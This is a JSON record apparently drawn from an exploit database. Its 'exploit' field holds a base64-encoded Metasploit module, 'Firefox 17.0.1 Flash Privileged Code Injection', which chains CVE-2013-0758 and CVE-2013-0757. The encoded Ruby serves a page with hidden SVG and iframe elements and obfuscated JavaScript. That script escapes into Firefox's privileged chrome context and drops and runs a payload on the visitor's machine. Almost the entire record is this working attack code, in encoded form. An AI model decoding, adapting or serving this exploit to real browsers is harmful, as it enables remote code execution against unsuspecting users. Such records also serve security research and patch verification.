{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBFeGNlbGxlbnRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6QnJvd3NlckV4cGxvaXRTZXJ2ZXINCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkVYRQ0KICAjIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6OkJyb3dzZXJBdXRvcHduDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6OkZpcmVmb3hQcml2aWxlZ2VFc2NhbGF0aW9uDQoNCiAgIyBhdXRvcHduX2luZm8oew0KICAjICAgOnVhX25hbWUgICAgPT4gSHR0cENsaWVudHM6OkZGLA0KICAjICAgOnVhX21pbnZlciAgPT4gIjE3LjAiLA0KICAjICAgOnVhX21heHZlciAgPT4gIjE3LjAuMSIsDQogICMgICA6amF2YXNjcmlwdCA9PiB0cnVlLA0KICAjICAgOnJhbmsgICAgICAgPT4gTm9ybWFsUmFua2luZw0KICAjIH0pDQoNCiAgZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KICAgIHN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQogICAgICAnTmFtZScgICAgICAgICAgID0+ICdGaXJlZm94IDE3LjAuMSBGbGFzaCBQcml2aWxlZ2VkIENvZGUgSW5qZWN0aW9uJywNCiAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgIFRoaXMgZXhwbG9pdCBnYWlucyByZW1vdGUgY29kZSBleGVjdXRpb24gb24gRmlyZWZveCAxNyBhbmQgMTcuMC4xLCBwcm92aWRlZA0KICAgICAgICB0aGUgdXNlciBoYXMgaW5zdGFsbGVkIEZsYXNoLiBObyBtZW1vcnkgY29ycnVwdGlvbiBpcyB1c2VkLg0KICAgICAgICBGaXJzdCwgYSBGbGFzaCBvYmplY3QgaXMgY2xvbmVkIGludG8gdGhlIGFub255bW91cyBjb250ZW50IG9mIHRoZSBTVkcNCiAgICAgICAgInVzZSIgZWxlbWVudCBpbiB0aGUgPGJvZHk+IChDVkUtMjAxMy0wNzU4KS4gRnJvbSB0aGVyZSwgdGhlIEZsYXNoIG9iamVjdA0KICAgICAgICBjYW4gbmF2aWdhdGUgYSBjaGlsZCBmcmFtZSB0byBhIFVSTCBpbiB0aGUgY2hyb21lOi8vIHNjaGVtZS4NCiAgICAgICAgVGhlbiBhIHNlcGFyYXRlIGV4cGxvaXQgKENWRS0yMDEzLTA3NTcpIGlzIHVzZWQgdG8gYnlwYXNzIHRoZSBzZWN1cml0eSB3cmFwcGVyDQogICAgICAgIGFyb3VuZCB0aGUgY2hpbGQgZnJhbWUncyB3aW5kb3cgcmVmZXJlbmNlIGFuZCBpbmplY3QgY29kZSBpbnRvIHRoZSBjaHJvbWU6Ly8NCiAgICAgICAgY29udGV4dC4gT25jZSB3ZSBoYXZlIGluamVjdGlvbiBpbnRvIHRoZSBjaHJvbWUgZXhlY3V0aW9uIGNvbnRleHQsIHdlIGNhbiB3cml0ZQ0KICAgICAgICB0aGUgcGF5bG9hZCB0byBkaXNrLCBjaG1vZCBpdCAoaWYgcG9zaXgpLCBhbmQgdGhlbiBleGVjdXRlLg0KICAgICAgICBOb3RlOiBGbGFzaCBpcyB1c2VkIGhlcmUgdG8gdHJpZ2dlciB0aGUgZXhwbG9pdCBidXQgYW55IEZpcmVmb3ggcGx1Z2luDQogICAgICAgIHdpdGggc2NyaXB0IGFjY2VzcyBzaG91bGQgYmUgYWJsZSB0byB0cmlnZ2VyIGl0Lg0KICAgICAgfSwNCiAgICAgICdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnVGFyZ2V0cycgPT4gWw0KICAgICAgICBbDQogICAgICAgICAgJ1VuaXZlcnNhbCAoSmF2YXNjcmlwdCBYUENPTSBTaGVsbCknLCB7DQogICAgICAgICAgICAnUGxhdGZvcm0nID0+ICdmaXJlZm94JywNCiAgICAgICAgICAgICdBcmNoJyA9PiBBUkNIX0ZJUkVGT1gNCiAgICAgICAgICB9DQogICAgICAgIF0sDQogICAgICAgIFsNCiAgICAgICAgICAnTmF0aXZlIFBheWxvYWQnLCB7DQogICAgICAgICAgICAnUGxhdGZvcm0nID0+ICV3eyBqYXZhIGxpbnV4IG9zeCBzb2xhcmlzIHdpbiB9LA0KICAgICAgICAgICAgJ0FyY2gnICAgICA9PiBBUkNIX0FMTA0KICAgICAgICAgIH0NCiAgICAgICAgXQ0KICAgICAgXSwNCiAgICAgICdEZWZhdWx0VGFyZ2V0JyA9PiAwLA0KICAgICAgJ0F1dGhvcicgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgJ01hcml1cyBNbHluc2tpJywgIyBkaXNjb3ZlcnkgJiBidWcgcmVwb3J0DQogICAgICAgICAgJ2pvZXYnLCAgICAgICAgICAgIyBtZXRhc3Bsb2l0IG1vZHVsZQ0KICAgICAgICAgICdzaW5uM3InICAgICAgICAgICMgbWV0YXNwbG9pdCBmdQ0KICAgICAgICBdLA0KICAgICAgJ1JlZmVyZW5jZXMnICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWydDVkUnLCAnMjAxMy0wNzU4J10sICAjIG5hdmlnYXRlIGEgZnJhbWUgdG8gYSBjaHJvbWU6Ly8gVVJMDQogICAgICAgICAgWydDVkUnLCAnMjAxMy0wNzU3J10sICAjIGJ5cGFzcyBDaHJvbWUgT2JqZWN0IFdyYXBwZXIgdG8gdGFsayB0byBjaHJvbWU6Ly8NCiAgICAgICAgICBbJ09TVkRCJywgJzg5MDE5J10sICAjIG1hcHMgdG8gQ1ZFIDIwMTMtMDc1Nw0KICAgICAgICAgIFsnT1NWREInLCAnODkwMjAnXSwgICMgbWFwcyB0byBDVkUgMjAxMy0wNzU4DQogICAgICAgICAgWydVUkwnLCAnaHR0cDovL3d3dy5tb3ppbGxhLm9yZy9zZWN1cml0eS9hbm5vdW5jZS8yMDEzL21mc2EyMDEzLTE1Lmh0bWwnXSwNCiAgICAgICAgICBbJ1VSTCcsICdodHRwczovL2J1Z3ppbGxhLm1vemlsbGEub3JnL3Nob3dfYnVnLmNnaT9pZD04MTM5MDYnXQ0KICAgICAgICBdLA0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAnSmFuIDA4IDIwMTMnLA0KICAgICAgJ0Jyb3dzZXJSZXF1aXJlbWVudHMnID0+IHsNCiAgICAgICAgOnNvdXJjZSAgPT4gJ3NjcmlwdCcsDQogICAgICAgIDp1YV9uYW1lID0+IEh0dHBDbGllbnRzOjpGRiwNCiAgICAgICAgOnVhX3ZlciAgPT4gLzE3XC4uKi8sDQogICAgICAgIDpmbGFzaCAgID0+IC9bXGQuXSsvDQogICAgICB9DQogICAgKSkNCg0KICAgIHJlZ2lzdGVyX29wdGlvbnMoDQogICAgICBbDQogICAgICAgIE9wdFN0cmluZy5uZXcoJ0NPTlRFTlQnLCBbIGZhbHNlLCAiQ29udGVudCB0byBkaXNwbGF5IGluc2lkZSB0aGUgSFRNTCA8Ym9keT4uIiwgJycgXSApLA0KICAgICAgICBPcHRCb29sLm5ldygnREVCVUdfSlMnLCBbZmFsc2UsICJEaXNwbGF5IHNvbWUgYWxlcnQoKSdzIGZvciBkZWJ1Z2dpbmcgdGhlIHBheWxvYWQuIiwgZmFsc2VdKQ0KICAgICAgXSwgQXV4aWxpYXJ5OjpUaW1lZCkNCg0KICBlbmQNCg0KICBkZWYgb25fcmVxdWVzdF9leHBsb2l0KGNsaSwgcmVxdWVzdCwgaW5mbykNCiAgICBpZiByZXF1ZXN0LnVyaSA9fiAvXC5zd2YkLw0KICAgICAgIyBzZW5kIEZsYXNoIC5zd2YgZm9yIG5hdmlnYXRpbmcgdGhlIGZyYW1lIHRvIGNocm9tZTovLw0KICAgICAgcHJpbnRfc3RhdHVzKCJTZW5kaW5nIC5zd2YgdHJpZ2dlci4iKQ0KICAgICAgc2VuZF9yZXNwb25zZShjbGksIGZsYXNoX3RyaWdnZXIsIHsgJ0NvbnRlbnQtVHlwZScgPT4gJ2FwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoJyB9KQ0KICAgIGVsc2UNCiAgICAgICMgc2VuZCBpbml0aWFsIEhUTUwgcGFnZQ0KICAgICAgcHJpbnRfc3RhdHVzKCJUYXJnZXQgc2VsZWN0ZWQ6ICN7dGFyZ2V0Lm5hbWV9IikNCiAgICAgIHByaW50X3N0YXR1cygiU2VuZGluZyAje3NlbGYubmFtZX0iKQ0KICAgICAgc2VuZF9yZXNwb25zZV9odG1sKGNsaSwgZ2VuZXJhdGVfaHRtbChjbGksIHRhcmdldCkpDQogICAgZW5kDQogIGVuZA0KDQogICMgQHJldHVybiBbU3RyaW5nXSB0aGUgY29udGVudHMgb2YgdGhlIC5zd2YgZmlsZSB1c2VkIHRvIHRyaWdnZXIgdGhlIGV4cGxvaXQNCiAgZGVmIGZsYXNoX3RyaWdnZXINCiAgICBzd2ZfcGF0aCA9IEZpbGUuam9pbihNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgImV4cGxvaXRzIiwgImN2ZS0yMDEzLTA3NTguc3dmIikNCiAgICBAZmxhc2hfdHJpZ2dlciB8fD0gRmlsZS5yZWFkKHN3Zl9wYXRoKQ0KICBlbmQNCg0KICAjIEByZXR1cm4gW1N0cmluZ10gY29udGFpbmluZyBqYXZhc2NyaXB0IHRoYXQgd2lsbCBhbGVydCBhIGRlYnVnIHN0cmluZw0KICAjICAgaWYgdGhlIERFQlVHIGlzIHNldCB0byB0cnVlDQogIGRlZiBqc19kZWJ1ZyhzdHIsIHF1b3RlPSInIikNCiAgICBpZiBkYXRhc3RvcmVbJ0RFQlVHX0pTJ10gdGhlbiAiYWxlcnQoI3txdW90ZX0je3N0cn0je3F1b3RlfSkiIGVsc2UgJycgZW5kDQogIGVuZA0KDQogICMgQHJldHVybiBbU3RyaW5nXSBIVE1MIHRoYXQgaXMgc2VudCBpbiB0aGUgZmlyc3QgcmVzcG9uc2UgdG8gdGhlIGNsaWVudA0KICBkZWYgZ2VuZXJhdGVfaHRtbChjbGksIHRhcmdldCkNCiAgICB2YXJzID0gew0KICAgICAgOnN5bWJvbF9pZCAgICAgICAgPT4gJ2EnLA0KICAgICAgOnJhbmRvbV9kb21haW4gICAgPT4gJ3NhZmUnLA0KICAgICAgOnBheWxvYWQgICAgICAgICAgPT4gcnVuX3BheWxvYWQsICMgZGVmaW5lZCBpbiBGaXJlZm94UHJpdmlsZWdlRXNjYWxhdGlvbiBtaXhpbg0KICAgICAgOnBheWxvYWRfdmFyICAgICAgPT4gJ2MnLA0KICAgICAgOnBheWxvYWRfa2V5ICAgICAgPT4gJ2snLA0KICAgICAgOnBheWxvYWRfb2JqX3ZhciAgPT4gJ3BheWxvYWRfb2JqJywNCiAgICAgIDppbnRlcnZhbF92YXIgICAgID0+ICdpdHZsJywNCiAgICAgIDphY2Nlc3Nfc3RyaW5nICAgID0+ICdhY2Nlc3MnLA0KICAgICAgOmZyYW1lX3JlZiAgICAgICAgPT4gJ2ZyYW1lc1swXScsDQogICAgICA6ZnJhbWVfbmFtZSAgICAgICA9PiAnbicsDQogICAgICA6bG9hZGVyX3BhdGggICAgICA9PiAiI3tnZXRfbW9kdWxlX3VyaX0uc3dmIiwNCiAgICAgIDpjb250ZW50ICAgICAgICAgID0+IHNlbGYuZGF0YXN0b3JlWydDT05URU5UJ10gfHwgJycNCiAgICB9DQogICAgc2NyaXB0ID0ganNfb2JmdXNjYXRlICVRfA0KICAgICAgdmFyICN7dmFyc1s6cGF5bG9hZF9vYmpfdmFyXX0gPSAje0pTT04udW5wYXJzZSh7dmFyc1s6cGF5bG9hZF9rZXldID0+IHZhcnNbOnBheWxvYWRdfSl9Ow0KICAgICAgdmFyICN7dmFyc1s6cGF5bG9hZF92YXJdfSA9ICN7dmFyc1s6cGF5bG9hZF9vYmpfdmFyXX1bJyN7dmFyc1s6cGF5bG9hZF9rZXldfSddOw0KICAgICAgZnVuY3Rpb24gJCgpIHsNCiAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignYmFzZScpLmhyZWYgPSAiaHR0cDovL3d3dy4je3ZhcnNbOnJhbmRvbV9kb21haW5dfS5jb20vIjsNCiAgICAgIH0NCiAgICAgIGZ1bmN0aW9uIF8oKSB7DQogICAgICAgIHJldHVybiAnI3t2YXJzWzpmcmFtZV9uYW1lXX0nOw0KICAgICAgfQ0KICAgICAgdmFyICN7dmFyc1s6aW50ZXJ2YWxfdmFyXX0gPSBzZXRJbnRlcnZhbChmdW5jdGlvbigpew0KICAgICAgICB0cnl7ICN7dmFyc1s6ZnJhbWVfcmVmXX1bJyN7dmFyc1s6YWNjZXNzX3N0cmluZ119J10gfQ0KICAgICAgICBjYXRjaChlKXsNCiAgICAgICAgICBjbGVhckludGVydmFsKCN7dmFyc1s6aW50ZXJ2YWxfdmFyXX0pOw0KICAgICAgICAgIHZhciBwID0gT2JqZWN0LmdldFByb3RvdHlwZU9mKCN7dmFyc1s6ZnJhbWVfcmVmXX0pOw0KICAgICAgICAgIHZhciBvID0ge19fZXhwb3NlZFByb3BzX186IHtzZXRUaW1lb3V0OiAicnciLCBjYWxsOiAicncifX07DQogICAgICAgICAgT2JqZWN0LnByb3RvdHlwZS5fX2xvb2t1cFNldHRlcl9fKCJfX3Byb3RvX18iKS5jYWxsKHAsIG8pOw0KICAgICAgICAgIHAuc2V0VGltZW91dC5jYWxsKCN7dmFyc1s6ZnJhbWVfcmVmXX0sICN7dmFyc1s6cGF5bG9hZF92YXJdfSwgMSk7DQogICAgICAgIH0NCiAgICAgIH0sIDEwMCk7DQogICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdvYmplY3QnKS5kYXRhID0gIiN7dmFyc1s6bG9hZGVyX3BhdGhdfSI7DQogICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCd1c2UnKS5zZXRBdHRyaWJ1dGVOUygNCiAgICAgICAgImh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiLCAiaHJlZiIsIGxvY2F0aW9uLmhyZWYgKyAiIyN7dmFyc1s6c3ltYm9sX2lkXX0iDQogICAgICApOw0KICAgIHwNCg0KICAgICVRfA0KICAgICAgPCFkb2N0eXBlIGh0bWw+DQogICAgICA8aHRtbD4NCiAgICAgIDxoZWFkPg0KICAgICAgICA8YmFzZSBocmVmPSJjaHJvbWU6Ly9icm93c2VyL2NvbnRlbnQvIj4NCiAgICAgIDwvaGVhZD4NCiAgICAgIDxib2R5Pg0KICAgICAgPHN2ZyBzdHlsZT0ncG9zaXRpb246IGFic29sdXRlO3RvcDotNTAwcHg7bGVmdDotNTAwcHg7d2lkdGg6MXB4O2hlaWdodDoxcHgnPg0KICAgICAgICA8c3ltYm9sIGlkPSIje3ZhcnNbOnN5bWJvbF9pZF19Ij4NCiAgICAgICAgICA8Zm9yZWlnbk9iamVjdD4NCiAgICAgICAgICAgIDxvYmplY3Q+PC9vYmplY3Q+DQogICAgICAgICAgPC9mb3JlaWduT2JqZWN0Pg0KICAgICAgICA8L3N5bWJvbD4NCiAgICAgICAgPHVzZSAvPg0KICAgICAgPC9zdmc+DQogICAgICA8c2NyaXB0Pg0KICAgICAgI3tzY3JpcHR9DQogICAgICA8L3NjcmlwdD4NCiAgICAgIDxpZnJhbWUgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlO3RvcDotNTAwcHg7bGVmdDotNTAwcHg7d2lkdGg6MXB4O2hlaWdodDoxcHgiDQogICAgICAgIG5hbWU9IiN7dmFyc1s6ZnJhbWVfbmFtZV19Ij48L2lmcmFtZT4NCiAgICAgICN7dmFyc1s6Y29udGVudF19DQogICAgICA8L2JvZHk+DQogICAgICA8L2h0bWw+DQogICAgICB8DQogIGVuZA0KZW5k", 
    "filename": "platforms/multiple/local/41683.rb", 
    "id": "41683", 
    "cves": [
        "CVE-2013-0757", 
        "CVE-2013-0758"
    ]
}